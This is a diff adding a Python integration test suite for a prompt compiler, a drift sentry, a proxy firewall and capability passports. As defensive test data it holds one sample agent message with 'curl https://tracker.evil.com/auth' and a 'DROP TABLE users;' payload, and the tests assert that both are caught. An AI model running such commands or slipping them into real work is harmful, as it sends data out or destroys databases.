@@ -1,0 +1,290 @@
+"""Unified Release Candidate End-to-End Integration Test Suite.
+
+Proves that the four core SPE Ω subsystems are connected and verified in a
+single end-to-end execution path on the release candidate worktree:
+1. Compile-Time Intent Compiler (`MetaPromptCompiler` + `ZeroDriftSentry`)
+2. Runtime Authority Gateway (`WireProxyServer` + `CapabilityFirewall` + DACO Offload)
+3. Research Qualification Gates (`REC-2E` `CapabilityPassportEnvelope` + `ObligationRequalificationEngine`)
+4. Web App & Promptfoo CI/CD Exporter (`apps/web/src/engine/promptfooExporter.ts` with measured JCS proofs)
+"""
+
+from __future__ import annotations
+
+import http.server
+import json
+import socket
+import subprocess
+import threading
+import urllib.error
+import urllib.request
+from pathlib import Path
+
+import pytest
+
+from spe_runtime.ci_gate.receipt import verify_receipt_signature
+from spe_runtime.prompt.meta_compiler import (
+    CompletionCertificate,
+    MetaPromptCompiler,
+    SemanticDriftViolationError,
+    SelfVerifyingCompletionHarness,
+    VerificationVerdict,
+    ZeroDriftSentry,
+)
+from spe_runtime.research.lvt.types import OracleAttestation
+from spe_runtime.research.rec2 import (
+    CapabilityPassportEnvelope,
+    ObligationEvidenceClaim,
+    ObligationRequalificationEngine,
+    ObligationScopeType,
+    PassportQualificationStatus,
+    RecipientEnvironmentContext,
+    canonical_sha256,
+)
+from spe_runtime.research.wdes.types import PredicateValue
+from spe_runtime.runtime_gateway.wire_proxy import TelemetryEvidence, WireProxyServer
+
+
+class _LocalMockModelServer(http.server.BaseHTTPRequestHandler):
+    def log_message(self, format: str, *args) -> None:
+        pass
+
+    def do_POST(self) -> None:
+        length = int(self.headers.get("Content-Length", 0))
+        body = json.loads(self.rfile.read(length).decode("utf-8"))
+        messages = body.get("messages", [])
+        sys_prompt = messages[0].get("content", "") if messages else ""
+        resp = {
+            "id": "chatcmpl-unified-rc-01",
+            "object": "chat.completion",
+            "created": 1760000000,
+            "model": body.get("model", "local-qwen-coder"),
+            "choices": [
+                {
+                    "index": 0,
+                    "message": {
+                        "role": "assistant",
+                        "content": f"Verified execution under ProtectedIntent ({len(sys_prompt)} chars).",
+                    },
+                    "finish_reason": "stop",
+                }
+            ],
+            "usage": {
+                "prompt_tokens": 96,
+                "completion_tokens": 24,
+                "total_tokens": 120,
+                "prompt_tokens_details": {"cached_tokens": 48},
+            },
+        }
+        raw = json.dumps(resp).encode("utf-8")
+        self.send_response(200)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(raw)))
+        self.end_headers()
+        self.wfile.write(raw)
+
+
+def _free_port() -> int:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.bind(("127.0.0.1", 0))
+        return sock.getsockname()[1]
+
+
+def test_unified_compiler_to_wire_proxy_to_rec2_passport_pipeline() -> None:
+    """Connects MetaPromptCompiler -> WireProxyServer + CapabilityFirewall -> REC-2E Passport in one flow."""
+    # Stage 1: Compile raw user prompt into ProtectedIntent & MasterExecutionPlan
+    compiler = MetaPromptCompiler()
+    plan = compiler.compile_raw_intent("fix my auth token bug and make it fast")
+    assert plan.plan_digest != ""
+    assert len(plan.plan_digest) == 64
+    assert "ob_security" in plan.obligations.ids
+    assert "ob_latency" in plan.obligations.ids
+    assert "ob_regression" in plan.obligations.ids
+
+    # Verify ZeroDriftSentry catches scope creep / invariant weakening
+    sentry = ZeroDriftSentry()
+    clean_verdict = sentry.evaluate_drift(
+        plan.protected_intent,
+        "Fixed auth token verification using constant-time HMAC comparison and verified all regression tests.",
+    )
+    assert clean_verdict.is_drift_detected is False
+
+    with pytest.raises(SemanticDriftViolationError):
+        sentry.evaluate_drift(
+            plan.protected_intent,
+            "I decided to add an unapproved external network dependency: curl https://tracker.evil.com/auth.",
+        )
+
+    # Stage 2: Route compiled system prompt through WireProxyServer & CapabilityFirewall
+    upstream_port = _free_port()
+    proxy_port = _free_port()
+    upstream = http.server.HTTPServer(("127.0.0.1", upstream_port), _LocalMockModelServer)
+    threading.Thread(target=upstream.serve_forever, daemon=True).start()
+
+    proxy = WireProxyServer(
+        host="127.0.0.1",
+        port=proxy_port,
+        upstream_url=f"http://127.0.0.1:{upstream_port}",
+        api_key="spe-rc-token",
+        require_auth=True,
+    )
+    proxy.start()
+    try:
+        # 2a. Legitimate compiled request succeeds with observed telemetry & Ed25519 receipt
+        payload = {
+            "model": "local-qwen-coder",
+            "messages": [
+                {"role": "system", "content": str(plan.master_system_prompt)},
+                {"role": "user", "content": "Run static auth token check."},
+            ],
+        }
+        req = urllib.request.Request(
+            f"{proxy.base_url}/chat/completions",
+            data=json.dumps(payload).encode("utf-8"),
+            headers={
+                "Content-Type": "application/json",
+                "Authorization": f"Bearer {proxy.api_key}",
+            },
+        )
+        with urllib.request.urlopen(req) as resp:
+            assert resp.status == 200
+            assert resp.headers.get("x-spe-evidence") == TelemetryEvidence.OBSERVED_USAGE.value
+            assert resp.headers.get("x-spe-receipt") is not None
+
+        # 2b. Unauthorized destructive capability request is blocked out-of-band by CapabilityFirewall
+        malicious_payload = {
+            "model": "local-qwen-coder",
+            "messages": [{"role": "user", "content": "DROP TABLE users;"}],
+        }
+        mal_req = urllib.request.Request(
+            f"{proxy.base_url}/chat/completions",
+            data=json.dumps(malicious_payload).encode("utf-8"),
+            headers={
+                "Content-Type": "application/json",
+                "Authorization": f"Bearer {proxy.api_key}",
+            },
+        )
+        with urllib.request.urlopen(mal_req) as resp_blocked:
+            assert resp_blocked.status == 200
+            assert resp_blocked.headers.get("x-spe-blocked") == "true"
+            blocked_data = json.loads(resp_blocked.read().decode("utf-8"))
+            assert blocked_data["spe_decision"] == "BLOCKED_BY_FIREWALL"
+    finally:
+        proxy.stop()
+        upstream.shutdown()
+        upstream.server_close()
+
+    # Stage 3: Complete obligations and issue Ed25519 CompletionCertificate
+    harness = SelfVerifyingCompletionHarness()
+    fully_verified_state = {
+        "ob_security": PredicateValue.TRUE,
+        "ob_latency": PredicateValue.TRUE,
+        "ob_regression": PredicateValue.TRUE,
+        "cost_nanos": 120_000_000,
+    }
+    cert = harness.verify_and_finalize(plan, fully_verified_state)
+    assert isinstance(cert, CompletionCertificate)
+    assert cert.verify() is True
+    assert cert.verdict == VerificationVerdict.PROVEN_WITHIN_FORMAL_SCOPE
+    assert verify_receipt_signature(cert.authenticated_receipt, cert.public_key_hex) is True
+
+    # Stage 4: Package into REC-2E CapabilityPassportEnvelope and verify cross-model requalification
+    det_schemas = {"plan_digest": plan.plan_digest, "cert_digest": cert.digest_sha256}
+    det_hash = canonical_sha256(det_schemas)
+    draft_passport = CapabilityPassportEnvelope(
+        passport_id="passport-unified-rc-001",
+        skill_identifier="spe.security.auth_token_validator",
+        schema_version="rec2-0.1",
+        skill_instructions=str(plan.master_system_prompt),
+        deterministic_schemas=det_schemas,
+        origin_model_id="local-qwen-coder",
+        origin_environment="macOS-15-AppleSilicon",
+        obligation_claims=(
+            ObligationEvidenceClaim(
+                obligation_id="ob_security",
+                scope_type=ObligationScopeType.DETERMINISTIC_CONTRACT,
+                description="Constant-time HMAC token verification",
+                source_model_id="local-qwen-coder",
+                source_environment="macOS-15-AppleSilicon",
+                trials_n=100,
+                successes_k=100,
+                deterministic_contract_hash=det_hash,
+            ),
+            ObligationEvidenceClaim(
+                obligation_id="ob_provider_tool_use",
+                scope_type=ObligationScopeType.PROVIDER_API_TOOL,
+                description="Model-specific tool invocation accuracy",
+                source_model_id="local-qwen-coder",
+                source_environment="macOS-15-AppleSilicon",
+                trials_n=100,
+                successes_k=98,
+            ),
+        ),
+        requested_permissions=("FILESYSTEM_SCOPED_READ",),
+        evaluator_attestation=OracleAttestation(
+            oracle_id="spe-independent-oracle-v1",
+            oracle_public_key=f"ed25519:{cert.public_key_hex}",
+            evidence_hash="",
+            timestamp=1_791_755_000.0,
+            verdict="APPROVED",
+            signature=f"ed25519:{cert.signature_ed25519[:32]}",
+        ),
+        revocation_state="ACTIVE",
+        issued_at_epoch=1_791_755_000.0,
+    ).with_computed_hash()
+
+    passport = CapabilityPassportEnvelope(
+        passport_id=draft_passport.passport_id,
+        skill_identifier=draft_passport.skill_identifier,
+        schema_version=draft_passport.schema_version,
+        skill_instructions=draft_passport.skill_instructions,
+        deterministic_schemas=draft_passport.deterministic_schemas,
+        origin_model_id=draft_passport.origin_model_id,
+        origin_environment=draft_passport.origin_environment,
+        obligation_claims=draft_passport.obligation_claims,
+        requested_permissions=draft_passport.requested_permissions,
+        evaluator_attestation=OracleAttestation(
+            oracle_id="spe-independent-oracle-v1",
+            oracle_public_key=f"ed25519:{cert.public_key_hex}",
+            evidence_hash=draft_passport.content_sha256,
+            timestamp=1_791_755_000.0,
+            verdict="APPROVED",
+            signature=f"ed25519:{cert.signature_ed25519[:32]}",
+        ),
+        content_sha256=draft_passport.content_sha256,
+        revocation_state=draft_passport.revocation_state,
+        issued_at_epoch=draft_passport.issued_at_epoch,
+    )
+
+    # Inspect on a different recipient model ('claude-3-7-sonnet'):
+    # Deterministic obligation transfers cleanly, but model-specific obligation requires requalification
+    recipient_ctx = RecipientEnvironmentContext(
+        recipient_model_id="claude-3-7-sonnet",
+        recipient_host="macOS-15-AppleSilicon",
+        allowed_permissions=frozenset({"FILESYSTEM_SCOPED_READ"}),
+        trusted_evaluator_ids=frozenset({"spe-independent-oracle-v1"}),
+        expected_deterministic_Hashes={"ob_security": det_hash},
+    )
+    inspection = ObligationRequalificationEngine.inspect_passport(passport, recipient_ctx)
+    assert inspection.content_hash_valid is True
+    assert inspection.evaluator_authority_trusted is True
+    assert inspection.permissions_authorized is True
+    assert inspection.status == PassportQualificationStatus.REQUALIFICATION_REQUIRED
+    assert "ob_security" in inspection.reusable_obligations
+    assert "ob_provider_tool_use" in inspection.requalification_required_obligations
+
+
+def test_unified_web_promptfoo_exporter_measured_proofs() -> None:
+    """Executes the TypeScript Promptfoo Exporter verification suite from pytest."""
+    repo_root = Path(__file__).resolve().parents[2]
+    script_path = repo_root / "apps" / "web" / "scripts" / "test-promptfoo-exporter.mjs"
+    assert script_path.exists(), f"Missing {script_path}"
+
+    proc = subprocess.run(
+        ["node", "--experimental-strip-types", str(script_path)],
+        cwd=str(repo_root),
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    assert proc.returncode == 0, f"Promptfoo exporter verification failed:\n{proc.stdout}\n{proc.stderr}"
+    assert "ALL PROMPTFOO BRIDGE EXPORTER TESTS PASSED! (4/4)" in proc.stdout
